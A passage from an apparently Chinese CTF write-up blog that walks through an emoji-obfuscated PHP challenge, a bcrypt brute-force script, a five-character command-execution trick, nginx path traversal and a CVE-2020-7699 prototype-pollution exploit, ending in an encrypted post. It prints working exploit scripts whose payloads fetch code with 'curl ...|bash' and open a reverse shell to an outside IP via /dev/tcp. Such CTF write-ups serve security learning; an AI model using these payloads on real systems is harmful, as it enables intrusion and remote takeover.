ğŸ˜“ğŸ˜‰ğŸ˜¹ğŸ˜³ğŸ˜ºğŸ˜…ğŸ˜¡ğŸ˜©ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜´ğŸ˜‚ğŸ˜‰ğŸ™‰ğŸ˜ªğŸ˜“ğŸ˜’ğŸ™…ğŸ˜²ğŸ˜ƒğŸ˜¡ğŸ˜·ğŸ˜²ğŸ˜§ğŸ˜–ğŸ˜€ğŸ˜©ğŸ˜‚ğŸ˜·ğŸ˜¸ğŸ˜ ğŸ˜“ğŸ˜‰ğŸ˜¹ğŸ˜³ğŸ˜ºğŸ˜„ğŸ˜));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆæ˜¯ä»£ç æ ¼å¼åŒ–ï¼Œæ¥ç€å°±æ˜¯<strong>ç†è§£ä»£ç çš„æ‰§è¡Œé€»è¾‘ï¼Œé¡ºä¾¿æ”¹å˜ä»£ç é€»è¾‘</strong></p>
<p>çœ‹é¢˜è§£ä¸Šçœ‹çš„æ˜¯ç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æ··æ·†</p>
<p>ä¸ºä»€ä¹ˆè¦å…ˆçœ‹ç¬¬ä¸€ä¸ªå‡½æ•°</p>
<p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200929221307190.png" alt="image-20200929221307190"></p>
<p>æ‰€ä»¥æˆ‘ä»¬å°±æƒ³ç›´æ¥çœ‹åœ¨ä¸åŒå‚æ•°ä¸‹ç¬¬ä¸€ä¸ªå‡½æ•°æ‰§è¡Œè¾“å‡ºçš„ç»“æœï¼Œæ‰€ä»¥åœ¨ç¬¬ä¸€ä¸ªå‡½æ•°ä¸­æ·»åŠ </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼<span class="params">($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"åŠ å¯†åï¼š"</span>.$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰;</span><br><span class="line">	<span class="keyword">global</span> $ğŸ,$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…,$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰,$ğŸ,$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜;</span><br><span class="line">	$ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…= (<span class="string">"$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…"</span>)($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰)/<span class="number">4</span>;</span><br><span class="line">	$ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼ = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span> ($ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€ = <span class="number">0</span>;$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€&lt;$ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…;$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€++) &#123;</span><br><span class="line">		$ğŸ˜©ğŸ˜‚ğŸ˜¦ğŸ™ƒ =$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">1</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">2</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">3</span>];</span><br><span class="line">		$ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€ =<span class="number">0</span>;</span><br><span class="line">		$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º =<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> ($ğŸ˜±ğŸ˜½ğŸ™€ğŸ™ =<span class="number">0</span>;$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™&lt;<span class="number">8</span>;$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™++) &#123;</span><br><span class="line">			<span class="keyword">for</span> ($ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚=<span class="number">0</span>;$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚&lt;<span class="number">16</span>;$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚++) &#123;</span><br><span class="line">				<span class="keyword">if</span>($ğŸ˜©ğŸ˜‚ğŸ˜¦ğŸ™ƒ == $ğŸ[$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™][$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚]) &#123;</span><br><span class="line">					$ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€=$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™;</span><br><span class="line">					$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º = $ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		$ğŸ˜²ğŸ˜¾ğŸ˜¦ğŸ™„ = $ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€*<span class="number">16</span>+$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º;</span><br><span class="line">		$ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼ = $ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼.(<span class="string">"$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰"</span>)($ğŸ˜²ğŸ˜¾ğŸ˜¦ğŸ™„);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"åŸæ–‡ï¼š"</span>.(<span class="string">"$ğŸ"</span>)($ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼);</span><br><span class="line">	<span class="keyword">return</span> (<span class="string">"$ğŸ"</span>)($ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¹‹åä¾æ¬¡ä¿®æ”¹ä»£ç é€»è¾‘ï¼Œæ›¿æ¢å…¶ä¸­ç¬¬ä¸€ä¸ªå‡½æ•°è¾“å‡ºç»“æœ</p>
<p>æ ¸å¿ƒä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> ğŸ˜ğŸ˜<span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $ğŸ,$strlen,$chr,$base64_decode,$isset;</span><br><span class="line">	$path = <span class="string">"/var/www/html/sandbox/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">	mkdir($path);</span><br><span class="line">	chdir($path);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">		@exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">		<span class="comment">//</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">		@exec(<span class="string">"rm -rf"</span> . $path);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$ğŸ¯ = <span class="keyword">new</span> Bcrypt();</span><br><span class="line"></span><br><span class="line">$ğŸ”‘ = $_POST[<span class="string">"passwd"</span>];</span><br><span class="line">$ğŸ”’ = <span class="string">"$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe"</span>;</span><br><span class="line"><span class="keyword">if</span>($ğŸ¯-&gt;verify($passwd, $lock)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Password verified!"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Wow!!Now,hack it!"</span>;</span><br><span class="line">	ğŸ˜ğŸ˜();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;Password not match!&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶åå‘ç°æœ‰composeråŒ…ï¼Œå®‰è£…ï¼Œç„¶åæŸ¥èµ„æ–™bcrypt</p>
<h3 id="bcrypt"><a href="#bcrypt" class="headerlink" title="bcrypt"></a>bcrypt</h3><p><code>bcrypt</code>æ˜¯ä¸€ç§å“ˆå¸Œç®—æ³•ï¼Œå¯ä»¥é€šè¿‡ç¡¬ä»¶è¿›è¡Œæ‰©å±•ï¼ˆé€šè¿‡å¯é…ç½®çš„å¾ªç¯æ¬¡æ•°ï¼‰ã€‚</p>
<p><strong><code>bcrypt</code>æ˜¯ä¸€ç§å•å‘å“ˆå¸Œç®—æ³•ã€‚</strong>å¦‚æœä¸çŸ¥é“ç›ï¼Œåœ†<strong>å’Œå¯†ç </strong>ï¼ˆå¯†ç ï¼‰ï¼Œåˆ™æ— æ³•æ£€ç´¢çº¯æ–‡æœ¬å¯†ç ã€‚</p>
<blockquote>
<p>åŠ ç›ï¼š</p>
<p>å°±æ˜¯äººä¸ºçš„é€šè¿‡ä¸€ç»„éšæœºå­—ç¬¦ä¸ç”¨æˆ·åŸå¯†ç çš„ç»„åˆå½¢æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ï¼Œä»è€Œå¢åŠ ç ´è¯‘çš„éš¾åº¦ã€‚</p>
</blockquote>
<p>åœ¨phpä¸­ï¼Œä¸»è¦æœ‰å†…ç½®çš„å‡½æ•°<code>password_hash</code>å’Œ<code>password_verify</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = password_hash(<span class="string">'password'</span>,PASSWORD_DEFAULT);</span><br><span class="line"><span class="keyword">echo</span> $a.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(password_verify(<span class="string">'password'</span>,$a))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"failed"</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(password_get_info($a));</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¾“å‡ºä¿¡æ¯</span></span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">3</span>)</span><br><span class="line">  <span class="string">'algo'</span> =&gt; int <span class="number">1</span></span><br><span class="line">  <span class="string">'algoName'</span> =&gt; string <span class="string">'bcrypt'</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="string">'options'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">      <span class="string">'cost'</span> =&gt; int <span class="number">10</span></span><br><span class="line">$a = password_hash(<span class="string">'password'</span>,PASSWORD_DEFAULT,<span class="keyword">array</span>(<span class="string">'cost'</span> =&gt; <span class="number">11</span>));</span><br><span class="line"><span class="comment">//ç›¸åº”çš„costä¹Ÿä¼šå˜ä¸º11ï¼›</span></span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥å°±æ˜¯çˆ†ç ´ï¼Œå·²çŸ¥å¯†ç ä¸ºbcrypt+4ä½å°å†™å­—æ¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>; </span><br><span class="line"><span class="keyword">use</span> <span class="title">Bcrypt</span>\<span class="title">Bcrypt</span>; </span><br><span class="line">$key = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>; </span><br><span class="line">$bcrypt = <span class="keyword">new</span> Bcrypt(); </span><br><span class="line">$plaintext = <span class="string">'bcrypt'</span>;<span class="comment">//bcryptyyds </span></span><br><span class="line">$ciphertext = <span class="string">'$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe'</span>; </span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">26</span>;$i++) &#123; </span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;<span class="number">26</span>;$j++) &#123; </span><br><span class="line">        <span class="keyword">for</span>($k=<span class="number">0</span>;$k&lt;<span class="number">26</span>;$k++) &#123; </span><br><span class="line">            <span class="keyword">for</span>($m=<span class="number">0</span>;$m&lt;<span class="number">26</span>;$m++) &#123; </span><br><span class="line">                <span class="keyword">echo</span> $plaintext.$str.PHP_EOL; </span><br><span class="line">                $str = $key[$i].$key[$j].$key[$k].$key[$m]; </span><br><span class="line">                <span class="keyword">if</span>($bcrypt-&gt;verify($plaintext.$str, $ciphertext))&#123; </span><br><span class="line">                    <span class="keyword">echo</span>(<span class="string">"&lt;/br&gt;Password verified!&lt;/br&gt;"</span>); </span><br><span class="line">                    <span class="keyword">echo</span>(<span class="string">"Wow!!Now,hack it!&lt;/br&gt;"</span>); </span><br><span class="line">                &#125; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><p>æœ€ç»ˆçš„è€ƒç‚¹å°±æ˜¯å‘½ä»¤æ‰§è¡Œå¯ä»¥å‚è€ƒhitcon-ctf-2017</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> ğŸ˜ğŸ˜<span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $ğŸ,$strlen,$chr,$base64_decode,$isset;</span><br><span class="line">	$path = <span class="string">"/var/www/html/sandbox/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">	mkdir($path);</span><br><span class="line">	chdir($path);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">		@exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">		<span class="comment">//</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">		@exec(<span class="string">"rm -rf"</span> . $path);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é“é¢˜å¤§æ¦‚æ„æ€å°±æ˜¯å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œä½†å•æ¬¡è¾“å…¥å­—ç¬¦ä¸å¾—å¤§äº5ã€‚å› æ­¤åˆ©ç”¨linuxä¸‹ç‰¹æœ‰çš„å‘½ä»¤æ¥å†™å…¥shellåå¼¹ã€‚åŸç†å°±æ˜¯åˆ©ç”¨curl ip|bashç­‰å¾ˆå¤šæ–¹å¼å»åå¼¹shellã€‚é¡ºä¾¿ä¹Ÿå¤ä¹ äº†åå¼¹shellçš„ä¸€äº›åŸºæœ¬æ“ä½œ</p>
<p>å®˜æ–¹çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">url = <span class="string">"http://219.219.61.234:10048/?cmd="</span></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate "g&gt; ht- sl" to file "v"</span></span><br><span class="line">    <span class="string">'&gt;dir'</span>,</span><br><span class="line">    <span class="string">'&gt;sl'</span>,</span><br><span class="line">    <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line">    <span class="string">'&gt;ht-'</span>,</span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line">    <span class="comment"># reverse file "v" to file "x", content "ls -th &gt;g" '</span></span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="string">'*v&gt;x'</span>,</span><br><span class="line">    <span class="comment"># generate "curl 0X2761697D|bash"</span></span><br><span class="line">    <span class="string">'&gt;sh '</span>,</span><br><span class="line">    <span class="string">'&gt;ba\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\\'</span>,</span><br><span class="line">    <span class="string">'&gt;7D\\'</span>,</span><br><span class="line">    <span class="string">'&gt;69\\'</span>,</span><br><span class="line">    <span class="string">'&gt;61\\'</span>,</span><br><span class="line">    <span class="string">'&gt;27\\'</span>,</span><br><span class="line">    <span class="string">'&gt;0X\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\ \\'</span>,</span><br><span class="line">    <span class="string">'&gt;rl\\'</span>,</span><br><span class="line">    <span class="string">'&gt;cu\\'</span>,</span><br><span class="line">    <span class="comment"># got shell</span></span><br><span class="line">    <span class="string">'sh x'</span>,</span><br><span class="line">    <span class="string">'sh g'</span>,</span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span></span><br><span class="line">    data = &#123; <span class="string">'passwd'</span>:<span class="string">'bcryptyyds'</span>, &#125;</span><br><span class="line">    header = &#123; <span class="string">"Content-Type"</span> : <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">               <span class="string">"Accept"</span> : <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,ima ge/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span>,</span><br><span class="line">               <span class="string">"Upgrade-Insecure-Requests"</span> : <span class="string">"1"</span> &#125;</span><br><span class="line">    r = requests.post(url + urllib.quote(i),data=data,headers=header)</span><br><span class="line">    print(i)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªå¾ˆéƒé—·ï¼Œé…ç½®ç¯å¢ƒå¾ˆé•¿æ—¶é—´è¿˜æ˜¯æ²¡èƒ½å¼„å‡ºæ¥</p>
<h2 id="EZnode"><a href="#EZnode" class="headerlink" title="EZnode"></a>EZnode</h2><p>åº”è¯¥æ˜¯å›½èµ›åˆ†åŒºèµ›çš„é¢˜</p>
<h3 id="è€ƒç‚¹-3"><a href="#è€ƒç‚¹-3" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><p>nginxåå‘ä»£ç†é…ç½®é”™è¯¯</p>
<p>é¦–å…ˆæ¥å­¦ä¹ ä¸€ä¸‹ngnix</p>
<h3 id="ngnix"><a href="#ngnix" class="headerlink" title="ngnix"></a>ngnix</h3><p>ngnixæ˜¯ä¸€æ¬¾è‡ªç”±çš„ã€å¼€æºçš„ã€é«˜æ€§èƒ½çš„HTTPæœåŠ¡å™¨å’Œåå‘ä»£ç†æœåŠ¡å™¨ã€‚</p>
<p>ä¸»è¦åœ¨ä¸‰ä¸ªæ–¹é¢</p>
<ul>
<li>åå‘ä»£ç†</li>
<li>è´Ÿè½½å‡è¡¡</li>
<li>nginxç‰¹ç‚¹</li>
</ul>
<p><strong>åå‘ä»£ç†</strong></p>
<blockquote>
<p>å…ˆè¯´æ­£å‘ä»£ç†</p>
<p>å®¢æˆ·ç«¯éå¸¸æ˜ç¡®è¦è®¿é—®çš„æœåŠ¡å™¨åœ°å€ï¼›æœåŠ¡å™¨åªæ¸…æ¥šè¯·æ±‚æ¥è‡ªå“ªä¸ªä»£ç†æœåŠ¡å™¨ï¼Œè€Œä¸æ¸…æ¥šæ¥è‡ªå“ªä¸ªå…·ä½“çš„å®¢æˆ·ç«¯ï¼›æ­£å‘ä»£ç†æ¨¡å¼å±è”½æˆ–è€…éšè—äº†çœŸå®å®¢æˆ·ç«¯ä¿¡æ¯ã€‚</p>
</blockquote>
<p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004160128766.png" alt="image-20201004160128766"></p>
<p>ä¸Šé¢è¿™ä¸ªå›¾å°±å¾ˆå½¢è±¡äº†</p>
<p>å¤šä¸ªå®¢æˆ·ç«¯ç»™æœåŠ¡å™¨å‘é€çš„è¯·æ±‚ï¼ŒnginxæœåŠ¡å™¨æ¥æ”¶åˆ°ä¹‹åï¼Œ</p>
<p>æŒ‰ç…§ä¸€å®šçš„è§„åˆ™åˆ†å‘ç»™äº†åç«¯çš„ä¸šåŠ¡å¤„ç†æœåŠ¡å™¨è¿›è¡Œå¤„ç†äº†ã€‚</p>
<p>æ­¤æ—¶~è¯·æ±‚çš„æ¥æºä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯æ˜¯æ˜ç¡®çš„ï¼Œä½†æ˜¯è¯·æ±‚å…·ä½“ç”±å“ªå°æœåŠ¡å™¨å¤„ç†çš„å¹¶ä¸æ˜ç¡®äº†ï¼Œnginxæ‰®æ¼”çš„å°±æ˜¯ä¸€ä¸ªåå‘ä»£ç†è§’è‰²</p>
<p><strong>è´Ÿè½½å‡è¡¡</strong></p>
<p>åœ¨åå‘ä»£ç†ä¸­</p>
<p>å®¢æˆ·ç«¯ä¼šå‘æœåŠ¡ç«¯å‘å‡ºè¯·æ±‚ï¼Œè€ŒæœåŠ¡å™¨å°†æ¥å—åˆ°çš„è¯·æ±‚æŒ‰ç…§è§„åˆ™åˆ†å‘çš„è¿‡ç¨‹ï¼Œå°±å«åšè´Ÿè½½å‡è¡¡</p>
<p><strong>ngnixé…ç½®</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">main                                # å…¨å±€é…ç½®</span><br><span class="line"> </span><br><span class="line">events &#123;                            # nginxå·¥ä½œæ¨¡å¼é…ç½®</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">http &#123;                                # httpè®¾ç½®</span><br><span class="line">    ....</span><br><span class="line"> </span><br><span class="line">    server &#123;                        # æœåŠ¡å™¨ä¸»æœºé…ç½®</span><br><span class="line">        ....</span><br><span class="line">        location &#123;                    # è·¯ç”±é…ç½®</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        location path &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        location otherpath &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    server &#123;</span><br><span class="line">        ....</span><br><span class="line"> </span><br><span class="line">        location &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    upstream name &#123;                    # è´Ÿè½½å‡è¡¡é…ç½®</span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‘ç°æœ‰ç›®å½•ç©¿è¶Šæ¼æ´å‚è€ƒ</p>
<p><a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></p>
<p>/static../</p>
<p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004162700298.png" alt="image-20201004162700298"></p>
<p>ä¹‹åå°±æ˜¯æ‰¾cveäº†ï¼Œæ¯”è¾ƒèœï¼Œåªèƒ½å­¦ä¹ </p>
<p>cve-2020-7699</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'bash -c "bash -i &amp;&gt; /dev/tcp/39.97.105.125/8080 0&gt;&amp;1"'</span></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">r1 = requests.post(<span class="string">'http://219.219.61.234:20006/y0u_CaNn07_Gu3ss_tHe_pATh'</span>, files = &#123;<span class="string">'__proto__.outputFunctionName'</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">"x;process.mainModule.require('child_process').exec('&#123;&#125;');x"</span>.format(cmd))&#125;)</span><br><span class="line">print(r1.text)</span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">r2 = requests.get(<span class="string">'http://219.219.61.234:20006/'</span>)</span><br><span class="line">print(r2.text)</span><br></pre></td></tr></table></figure>
<p>ä¹‹ååå¼¹shellï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>Flag</title>
    <url>/2099/09/27/Flag/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Welcome to my blog, enter password to read.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19J8MnEMVwsOMSWYbECrCyX9PZqQn4L4/JALrn9QHkE/d4Fq19BOmWv/xIV6QHKkoPDMSPhAG7bYLicKJuwr90AstBwHf3j54bpa0bASQyMECYyHnWIF3URPfDyZYiYY0yWh9wzT76wSBY4yZ04pJJ6FacKF4jCsYsugnt7EpDjybzyoThL43pP8wPdWh33NM7syyVg1ZOBrvuQsQcn+2bIG5l4m9ChnWQvinKKkOxNIaNu5NJ4/HDbUBTlK9odaxG9YjPXkQCblFK34aH6ke5gPPfvbBoItjIcrv6TsJufhvXLn3lG5eF3WXCosTDE3uWlMdQtN36/0sL5QjAQUDEpvZD79AdGIYml//jot38/xeoOBS6IgoTdCkBKnkbSgKnyodq4wAt+6AJJvDsmpMwijMD+QZ92wJqY9VmIfd2AfSCLawXntD2G6LoghFUEnJ+LO5S4NZejgy8YxpvjQcfkzWyzSB449RoPhlb+232XA58lIyttQ8U6Srb4hJ9I/VCxkSNi/lrFV5s6MlgcL3nZrmqo7rMR+yphgn+w0HgiDnDasl2878y9pNBrapOiSAoC8Cw7rCu5+jzkHE+CHZDceuufpdK4dRZdOUIqv3ts1vI5eu11ubjG/dkpixiji7bWG9aXnqpCnIVq45M8qAHx7AO0gGXsFRoTcFP77vfbYzbIteWFYcBSdmjQ6s4PJfBM7lA1+Qw1Gb6S7Rtt1D+FvnA7VHPtxWRompu9FrfuGCtoBztqnR3P/xFErKaUgp0mpPhTXKpoDc18u0U/qOgpi8kon1XlfpOpFz8+XNBbSmhBgg44oESVj1ll5BZtO8koDoomQ81dOlyFQtrcCxJoYaQkhSe14HHnc9PoiYPoIyt6AbvtKemdvAb/k4YBMXAjNBBozHKZS/LF4w05HbEySZjh4DVWyyTtxdqmq9ouMU7WOSgS+2QKuVqwXkgFLQqGjHoqM2fzW96OFDEj9mAwThPOc+M3InNKTSFHnYtmcE0fvug7TyMBHooHFHhC5t+itXZqsNNoWsChRUOj55GbWJGtdgfQBEOBSyHYpKBtVBdXm2i+wEew3cQektfcGjw8mECespPRWAAQZtq0YqK5xCuf5aqGVLZxMagw1Dqotc54WmLeNiyhW/aowxY2hIjrKBP8wmShM1MfyLrBiaal9SK0yH7OU/L646HG+YUjxuiTj38pnAJpJwseVQYRXUdcORTpdFLbBbA+urzfAhIzBGHVWhPim9YFvNE6taYiwU1vM2Q5P49qWajR82O5PdmhtAHD0Z9xvZhuAjYnQB27ge4RCoPCr6kCbJ9ESX5dL4ivh0E8a2alufpxPhuERJxqU+jfyEx0Ftrw2/Mfz1YvMRRuBTN0Sq+R5dPSGNG+78HAJMmH5qbiDBA9VpPvxTCtwfxZn5LISQQQW+9EQzK8yJgeNEUNIk0LuvFgsVnvZ+Z3cRqsNkDURef+DgF4f1dad/GxDFfol0scnUwqfxCelsmHdrXdvPgk7IxVwC3D5pYAYJKE7ItncTEUsSWOR+zJ4gQxFPq8w8hej7n6uFUqPLrq1Ra4199bkDTnzCA8cFURa29nXJMCLD/2+dpAjNSE/M54pzn/PdcjGahg+v4deqGtGhpIOKbcUbXGSPuZuxQFwFYOtsn7Pvf72MA9mK1fcLkJP1XZP847/D+LRElOVqxMsTrM